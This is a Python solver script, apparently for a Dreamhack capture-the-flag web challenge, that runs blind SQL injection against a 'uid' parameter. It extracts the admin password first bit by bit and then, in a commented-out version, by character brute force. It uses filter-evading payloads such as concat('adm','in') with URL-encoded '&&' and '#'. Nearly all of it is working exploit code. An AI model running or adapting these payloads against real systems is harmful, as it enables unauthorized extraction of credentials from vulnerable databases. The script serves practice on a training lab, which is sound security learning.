# Using bit operation

import requests

Host = 'host3.dreamhack.games'
Port = 13259
url = f'http://{Host}:{Port}/'


# Get upw length
for i in range(1, 50):
    payload = f"aaa'||uid=concat('adm','in')%26%26char_length(upw)={i}%23"
    res = requests.get(f'{url}/?uid={payload}')

    if 'admin' in res.text:
        print(f'upw length: {i}')
        upw_length = i
        break

# Get a bit length of a character
upw_length = 44
bit_length_list = []
for i in range(1, upw_length + 1):
    bit_length = 1

    for j in range(0, 8 + 1):
        payload = f"aaa'||uid=concat('adm','in')%26%26length(bin(ascii(substr(upw,{i},1))))={bit_length}%23"
        res = requests.get(f'{url}/?uid={payload}')

        if 'admin' in res.text:
            print(f'upw[{i}] bit length: {bit_length}')
            bit_length_list.append(bit_length)
            break

        bit_length += 1

print(bit_length_list)

# Get a bit length of a character
flag = ''
upw_length = 44
for i in range(1, upw_length + 1):

    bits = ''
    for j in range(1, bit_length_list[i - 1] + 1):
        payload = f"aaa'||uid=concat('adm','in')%26%26substr(bin(ascii(substr(upw,{i},1))),{j},1)=1%23"
        res = requests.get(f'{url}/?uid={payload}')

        if 'admin' in res.text:
            bits += '1'
        else:
            bits += '0'

    print(bits)

    char = bytes.fromhex(hex(int(bits, 2))[2:]).decode('utf-8')
    flag += char
    print(flag)


'''
# Using bruetforce

import requests

Host = 'host3.dreamhack.games'
Port = 13259
url = f'http://{Host}:{Port}/'


# Get upw length
for i in range(1, 50):
    payload = f"aaa'||uid=concat('adm','in')%26%26char_length(upw)={i}%23"
    res = requests.get(f'{url}/?uid={payload}')

    if 'admin' in res.text:
        print(f'upw length: {i}')
        upw_length = i
        break

# Get upw
flag = ''
upw_length = 44
for i in range(1, upw_length + 1):

    for ch in range(32, 127):
        payload = f"aaa'||uid=concat('adm','in')%26%26substr(upw,{i},1)='{chr(ch)}'%23"
        res = requests.get(f'{url}/?uid={payload}')

        if 'admin' in res.text:
            flag += chr(ch)
            print(flag)
            break

'''
